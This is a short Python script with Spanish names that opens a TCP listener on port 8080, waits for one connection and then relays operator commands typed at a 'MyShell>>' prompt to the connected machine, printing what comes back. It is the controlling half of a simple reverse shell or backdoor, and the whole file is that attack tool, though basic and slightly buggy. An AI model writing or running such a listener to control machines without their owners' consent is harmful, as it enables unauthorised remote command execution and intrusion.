import socket

def conexion():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("Direccion IP",8080))
	s.listen(1)
	conn, addr = s.accept()
	print("Conectando....",addr)
	while True:
		command = input("MyShell>> ")
		if 'quit' in command:
			conn.send('quit')
			conn.close()
			break
		else:
			conn.send(str.encode(command))
			salida = str(conn.recv(16834))
			print(salida)

def main():
	conexion()

if __name__ == '__main__':
	main()
